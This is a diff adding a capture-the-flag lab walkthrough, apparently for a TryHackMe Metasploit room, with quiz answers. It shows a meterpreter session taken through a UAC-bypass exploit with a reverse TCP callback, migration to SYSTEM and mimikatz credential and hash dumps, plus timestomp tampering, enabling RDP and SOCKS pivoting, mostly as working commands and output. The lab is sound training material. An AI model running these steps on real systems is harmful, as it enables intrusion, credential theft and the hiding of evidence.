@@ -1684,3 +1684,846 @@ meterpreter > getsystem
 [-] priv_elevate_getsystem: Operation failed: 691 The following was attempted:
 [-] Named Pipe Impersonation (In Memory/Admin)
 [-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+[-] Named Pipe Impersonation (RPCSS variant)
+[-] Named Pipe Impersonation (PrintSpooler variant)
+[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
+```
+```text
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeChangeNotifyPrivilege
+SeIncreaseWorkingSetPrivilege
+SeShutdownPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+```
+```text
+meterpreter > pwd
+C:\Program Files (x86)\Icecast2 Win32
+```
+```text
+meterpreter > upload creds.txt
+[*] uploading  : /home/witty/Downloads/creds.txt -> creds.txt
+[*] Uploaded 21.00 B of 21.00 B (100.0%): /home/witty/Downloads/creds.txt -> creds.txt
+[*] uploaded   : /home/witty/Downloads/creds.txt -> creds.txt
+```
+```text
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session
+    ssl_verify                Modify the SSL certificate verification setting
+    transport                 Manage the transport mechanisms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcat          Read the contents of a local file to the screen
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_livessp          Retrieve Live SSP creds
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam           Dump LSA SAM (unparsed)
+    lsa_dump_secrets       Dump LSA secrets (unparsed)
+    password_change        Change the password/hash of a user
+    wifi_list              List wifi profiles/creds for the current user
+    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+```
+```text
+meterpreter > run
+Usage: run <script> [arguments]
+
+Executes a ruby script or Metasploit Post module in the context of the
+```
+```text
+meterpreter session.  Post modules can take arguments in var=val format.
+Example: run post/foo/bar BAZ=abcd
+```
+```text
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+Interface 12
+============
+Name         : Microsoft ISATAP Adapter
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1280
+IPv6 Address : fe80::5efe:a0a:5983
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+Interface 13
+============
+Name         : AWS PV Network Device #0
+Hardware MAC : 02:c3:1d:8c:26:79
+MTU          : 9001
+IPv4 Address : 10.10.89.131
+IPv4 Netmask : 255.255.0.0
+IPv6 Address : fe80::b498:6fbd:621e:b527
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+```
+```text
+meterpreter > run post/windows/gather/checkvm
+
+[*] Checking if the target is a Virtual Machine ...
+[+] This is a Xen Virtual Machine
+```
+```text
+meterpreter > creds_all
+[!] Not running as SYSTEM, execution may fail
+```
+```text
+meterpreter > hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+```
+```text
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.89.131 - Collecting local exploits for x86/windows...
+[*] 10.10.89.131 - 174 exploit checks are being tried...
+[+] 10.10.89.131 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.89.131 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
+[+] 10.10.89.131 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.89.131 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.89.131 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.89.131 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.89.131 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.89.131 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[+] 10.10.89.131 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
+[*] Running check method for exploit 41 / 41
+[*] 10.10.89.131 - Valid modules for session 3:
+============================
+```
+```text
+#   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
+ 3   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 6   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
+ 8   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+ 9   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
+ 10  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
+ 11  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
+ 12  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
+ 13  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
+ 14  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
+ 15  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
+ 16  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
+ 17  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
+ 18  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
+ 19  exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!
+ 20  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
+ 21  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
+ 22  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
+ 23  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
+ 24  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
+ 25  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
+ 26  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
+ 27  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
+ 28  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.
+ 29  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
+ 30  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
+ 31  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.
+ 32  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  No                       The target is not exploitable.
+ 33  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
+ 34  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
+ 35  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
+ 36  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
+ 37  exploit/windows/local/ntapphelpcachecontrol                    No                       The target is not exploitable.
+ 38  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
+ 39  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
+ 40  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
+ 41  exploit/windows/local/webexec                                  No                       The check raised an exception.
+```
+```text
+meterpreter > run post/windows/manage/enable_rdp
+
+[-] Insufficient privileges, Remote Desktop Service was not modified
+[*] For cleanup execute Meterpreter resource file: /home/witty/.msf4/loot/20230228165328_default_10.10.89.131_host.windows.cle_296360.txt
+```
+```text
+meterpreter > run exploit/windows/local/bypassuac_eventvwr
+
+[*] Started reverse TCP handler on 10.8.19.103:4444 
+[*] UAC is Enabled, checking level...
+[+] Part of Administrators group! Continuing...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[*] Configuring payload and stager registry keys ...
+[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
+[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
+[*] Sending stage (175686 bytes) to 10.10.89.131
+[*] Cleaning up registry keys ...
+[*] Meterpreter session 4 opened (10.8.19.103:4444 -> 10.10.89.131:49438) -0500
+[*] Session 4 created in the background.
+```
+```text
+meterpreter > 
+Background session 3? [y/N]
+```
+```text
+msf6 exploit(windows/http/icecast_header) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.8.19.103:4444 -> 10.10.89.
+                                                             131:49249 (10.10.89.131)
+  2         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.8.19.103:4444 -> 10.10.89.
+                                                             131:49422 (10.10.89.131)
+  3         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.8.19.103:4444 -> 10.10.89.
+                                                             131:49409 (10.10.89.131)
+  4         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.8.19.103:4444 -> 10.10.89.
+                                                             131:49438 (10.10.89.131)
+```
+```text
+msf6 exploit(windows/http/icecast_header) > sessions -i 4
+[*] Starting interaction with 4...
+```
+```text
+meterpreter > creds_all
+[-] The "creds_all" command requires the "kiwi" extension to be loaded (run: `load kiwi`)
+```
+```text
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+[!] Loaded x86 Kiwi on an x64 architecture.
+
+Success.
+```
+```text
+meterpreter > getuid
+Server username: Dark-PC\Dark
+```
+```text
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+```
+```text
+meterpreter > migrate -N spoolsv.exe
+[*] Migrating from 2632 to 1384...
+[*] Migration completed successfully.
+```
+```text
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+```text
+meterpreter > creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username  Domain   LM                      NTLM                    SHA1
+--------  ------   --                      ----                    ----
+Dark      Dark-PC  e52cac67419a9a22ecb083  7c4fe5eada682714a036e3  0d082c4b4f2aeafb67fd0ea
+                   69099ed302              9378362bab              568a997e9d3ebc0eb
+
+wdigest credentials
+===================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+DARK-PC$  WORKGROUP  (null)
+Dark      Dark-PC    Password01!
+
+tspkg credentials
+=================
+
+Username  Domain   Password
+--------  ------   --------
+Dark      Dark-PC  Password01!
+
+kerberos credentials
+====================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+Dark      Dark-PC    Password01!
+dark-pc$  WORKGROUP  (null)
+```
+```text
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
+[-] Error running command hashdump: NoMethodError undefined method `id' for nil:NilClass
+```
+```text
+meterpreter > screenshare
+[*] Preparing player...
+[*] Opening player at: /home/witty/Downloads/pNRgadAt.html
+[*] Streaming...
+
+^C[-] Error running command screenshare: Interrupt
+```
+```text
+meterpreter > record_mic
+[*] Starting...
+[-] stdapi_webcam_audio_record: Operation failed: The system cannot find the file specified.
+```
+```text
+meterpreter > timestomp ?
+
+Usage: timestomp <file(s)> OPTIONS
+
+OPTIONS:
+
+    -a   Set the "last accessed" time of the file
+    -b   Set the MACE timestamps so that EnCase shows blanks
+    -c   Set the "creation" time of the file
+    -e   Set the "mft entry modified" time of the file
+    -f   Set the MACE of attributes equal to the supplied file
+    -h   Help banner
+    -m   Set the "last written" time of the file
+    -r   Set the MACE timestamps recursively on a directory
+    -v   Display the UTC MACE values of the file
+    -z   Set all four attributes (MACE) of the file
+```
+```text
+meterpreter > cd Dark
+```
+```text
+meterpreter > dir
+Listing: C:\Users\Dark
+======================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+040777/rwxrwxrwx  0       dir    -0500  AppData
+040777/rwxrwxrwx  0       dir    -0500  Application Data
+040555/r-xr-xr-x  0       dir    -0500  Contacts
+040777/rwxrwxrwx  0       dir    -0500  Cookies
+040555/r-xr-xr-x  0       dir    -0500  Desktop
+040555/r-xr-xr-x  4096    dir    -0500  Documents
+040555/r-xr-xr-x  0       dir    -0500  Downloads
+040555/r-xr-xr-x  4096    dir    -0500  Favorites
+040555/r-xr-xr-x  0       dir    -0500  Links
+040777/rwxrwxrwx  0       dir    -0500  Local Settings
+040555/r-xr-xr-x  0       dir    -0500  Music
+040777/rwxrwxrwx  0       dir    -0500  My Documents
+100666/rw-rw-rw-  524288  fil    -0500  NTUSER.DAT
+100666/rw-rw-rw-  65536   fil    -0500  NTUSER.DAT{016888bd-6c6f-11de-8
+                                                           d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288  fil    -0500  NTUSER.DAT{016888bd-6c6f-11de-8
+                                                           d1d-001e0bcde3ec}.TMContainer00
+                                                           000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288  fil    -0500  NTUSER.DAT{016888bd-6c6f-11de-8
+                                                           d1d-001e0bcde3ec}.TMContainer00
+                                                           000000000000000002.regtrans-ms
+040777/rwxrwxrwx  0       dir    -0500  NetHood
+040555/r-xr-xr-x  0       dir    -0500  Pictures
+040777/rwxrwxrwx  0       dir    -0500  PrintHood
+040777/rwxrwxrwx  0       dir    -0500  Recent
+040555/r-xr-xr-x  0       dir    -0500  Saved Games
+040555/r-xr-xr-x  0       dir    -0500  Searches
+040777/rwxrwxrwx  0       dir    -0500  SendTo
+040777/rwxrwxrwx  0       dir    -0500  Start Menu
+040777/rwxrwxrwx  0       dir    -0500  Templates
+040555/r-xr-xr-x  0       dir    -0500  Videos
+100666/rw-rw-rw-  262144  fil    -0500  ntuser.dat.LOG1
+100666/rw-rw-rw-  0       fil    -0500  ntuser.dat.LOG2
+100666/rw-rw-rw-  20      fil    -0500  ntuser.ini
+```
+```text
+meterpreter > cd Downloads
+```
+```text
+meterpreter > upload creds.txt
+[*] uploading  : /home/witty/Downloads/creds.txt -> creds.txt
+[*] Uploaded 21.00 B of 21.00 B (100.0%): /home/witty/Downloads/creds.txt -> creds.txt
+[*] uploaded   : /home/witty/Downloads/creds.txt -> creds.txt
+```
+```text
+meterpreter > timestomp -m "04/04/1998 12:12:12" "C:\Users\Dark\Downloads\creds.txt"
+[*] Setting specific MACE attributes on C:\Users\Dark\Downloads\creds.txt
+```
+```text
+meterpreter > dir
+Listing: C:\Users\Dark\Downloads
+================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  21    fil   1998-04-04 13:12:12 -0500  creds.txt
+100666/rw-rw-rw-  282   fil    -0500  desktop.ini
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat creds.txt 
+pasta:pastaisdynamic
+```
+```text
+meterpreter > wifi_list
+
+[-] No wireless profiles found on the target.
+```
+```text
+meterpreter > run post/windows/manage/enable_rdp
+
+[*] Enabling Remote Desktop
+[*] 	RDP is already enabled
+[*] Setting Terminal Services service startup mode
+[*] 	The Terminal Services service is not set to auto, changing it to auto ...
+[*] 	Opening port in local firewall if necessary
+[*] For cleanup execute Meterpreter resource file: /home/witty/.msf4/loot/20230228172649_default_10.10.89.131_host.windows.cle_645917.txt
+```
+```text
+meterpreter > shell
+Process 3444 created.
+Channel 6 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\Dark\Downloads>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECF2-DF42
+
+ Directory of C:\Users\Dark\Downloads
+
+02/28/2023  04:12 PM    <DIR>          .
+02/28/2023  04:12 PM    <DIR>          ..
+04/04/1998  12:12 PM                21 creds.txt
+               1 File(s)             21 bytes
+               2 Dir(s)  20,011,905,024 bytes free
+
+C:\Users\Dark\Downloads>dir /a
+dir /a
+ Volume in drive C has no label.
+ Volume Serial Number is ECF2-DF42
+
+ Directory of C:\Users\Dark\Downloads
+
+02/28/2023  04:12 PM    <DIR>          .
+02/28/2023  04:12 PM    <DIR>          ..
+04/04/1998  12:12 PM                21 creds.txt
+11/12/2019  04:48 PM               282 desktop.ini
+               2 File(s)            303 bytes
+               2 Dir(s)  20,011,905,024 bytes free
+```
+![[Pasted image 20230228170216.png]]
+First things first, our initial shell/process typically isn't very stable. Let's go ahead and attempt to move to a different process. First, let's list the processes using the command `ps`. What's the name of the spool service?
+I've included this example as the spool service is traditionally very stable and restarts pretty quickly in the case that we crash it.
+*spoolsv.exe*
+Let's go ahead and move into the spool process or at least attempt to! What command do we use to transfer ourselves into the process? This won't work at the current time as we don't have sufficient privileges but we can still try!
+Like birds, we've gotta migrate.
+*migrate*
+Well that migration didn't work, let's find out some more information about the system so we can try to elevate. What command can we run to find out more information regarding the current user running the process we are in?
+*getuid*
+How about finding more information out about the system itself?
+*sysinfo*
+This might take a little bit of googling, what do we run to load mimikatz (more specifically the new version of mimikatz) so we can use it?
+The new version of mimikatz is referred to as 'kiwi' in metasploit.
+*load kiwi*
+Let's go ahead and figure out the privileges of our current user, what command do we run?
+*getprivs*
+What command do we run to transfer files to our victim computer?
+*upload*
+How about if we want to run a Metasploit module?
+Similar to how we ran the exploit previously
+*run*
+A simple question but still quite necessary, what command do we run to figure out the networking information and interfaces on our victim?
+There are two forms here, I'm looking for the option including the character 'p' and is otherwise a Windows command.
+*ipconfig*
+Let's go ahead and run a few post modules from Metasploit. First, let's run the command run `post/windows/gather/checkvm`. This will determine if we're in a VM, a very useful piece of knowledge for further pivoting.
+Completed
+Next, let's try: `run post/multi/recon/local_exploit_suggester`. This will check for various exploits which we can run within our session to elevate our privileges. Feel free to experiment using these suggestions, however, we'll be going through this in greater detail in the room [Ice](https://tryhackme.com/room/ice).
+Completed
+Finally, let's try forcing RDP to be available. This won't work since we aren't administrators, however, this is a fun command to know about: `run post/windows/manage/enable_rdp`
+Completed
+One quick extra question, what command can we run in our meterpreter session to spawn a normal system shell?
+*shell*
+### Makin' Cisco Proud
+Last but certainly not least, let's take a look at the autorouting options available to us in Metasploit. While our victim machine may not have multiple network interfaces (NICs), we'll walk through the motions of pivoting through our victim as if it did have access to extra networks.
+Answer the questions below
+```text
+C:\Users\Dark\Downloads>^Z
+Background channel 6? [y/N]  y
+```
+```text
+meterpreter > run autoroute -h
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Usage:   run autoroute [-r] -s subnet -n netmask
+[*] Examples:
+[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
+[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
+[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
+[*]   run autoroute -p                            # Print active routing table
+[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
+[*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
+[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module
+```
+```text
+meterpreter > run autoroute -s 172.18.1.0 -n 255.255.255.0
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 172.18.1.0/255.255.255.0...
+[-] Could not execute autoroute: ArgumentError Invalid :session, expected Session object got Msf::Sessions::Meterpreter_x86_Win
+```
+```text
+meterpreter > 
+Background session 4? [y/N]
+```
+```text
+msf6 exploit(windows/http/icecast_header) > search server/socks5
+[-] No results from search
+
+uhmm let's update it
+
+┌──(root㉿kali)-[/home/witty/Downloads]
+└─# apt update; apt install metasploit-framework
+```
+```text
+msf6 exploit(windows/http/icecast_header) > exit
+[*] You have active sessions open, to exit anyway type "exit -y"
+```
+```text
+msf6 exploit(windows/http/icecast_header) > exit -y
+
+I see the problem it was updated  to auxiliary/server/socks_proxy
+```
+```text
+msf6 > search socks
+
+Matching Modules
+================
+```
+```text
+#  Name                                     Disclosure Date  Rank    Check  Description
+   -  ----                                     ---------------  ----    -----  -----------
+   0  auxiliary/server/socks_proxy                              normal  No     SOCKS Proxy Server
+   1  auxiliary/server/socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection
+   2  auxiliary/scanner/http/sockso_traversal         normal  No     Sockso Music Host Server 1.5 Directory Traversal
+
+Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/http/sockso_traversal
+```
+```text
+msf6 > use 0
+```
+```text
+msf6 auxiliary(server/socks_proxy) > show options
+
+Module options (auxiliary/server/socks_proxy):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network inter
+                                       face to listen on. This must be
+                                        an address on the local machin
+                                       e or 0.0.0.0 to listen on all a
+                                       ddresses.
+   SRVPORT  1080             yes       The port to listen on
+   VERSION  5                yes       The SOCKS version to use (Accep
+                                       ted: 4a, 5)
+
+   When VERSION is 5:
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        Proxy password for SOCKS5 list
+                                        ener
+   USERNAME                   no        Proxy username for SOCKS5 list
+                                        ener
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run a SOCKS proxy server
+
+View the full module info with the info, or info -d command.
+```
+```text
+┌──(kali㉿kali)-[/home/witty/Downloads]
+└─$ tail /etc/proxychains.conf 
+#
+```
+```text
+#       proxy types: http, socks4, socks5
+```
+```text
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+```
+```text
+# add proxy here ...
+```
+```text
+# meanwile
+```
+```text
+# defaults set to "tor"
+socks4 	127.0.0.1 9050
+
+uncomment dynamic_chain  with and comment others # also uncomment proxy_dns
+```
+```text
+msf6 auxiliary(server/socks_proxy) > use auxiliary/server/socks_proxy
+```
+```text
+msf6 auxiliary(server/socks_proxy) > run srvhost=127.0.0.1 srvport=9050 version=4a
+[*] Auxiliary module running as background job 0.
+```
+```text
+msf6 auxiliary(server/socks_proxy) > 
+[*] Starting the SOCKS proxy server
+```
+```text
+┌──(kali㉿kali)-[/home/witty/Downloads]
+└─$ proxychains -q nmap -n -sT -Pn -p 135 -sV 10.10.89.131 --min-rate 5000
+Starting Nmap 7.93 ( https://nmap.org )
+Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 100.00% done; ETC: 18:00 (0:00:00 remaining)
+Nmap scan report for 10.10.89.131
+Host is up (1.1s latency).
+
+PORT    STATE SERVICE VERSION
+135/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+Let's go ahead and run the command `run autoroute -h`, this will pull up the help menu for autoroute. What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the `-n` flag in your answer.
+*run autoroute -s 172.18.1.0 -n 255.255.255.0*
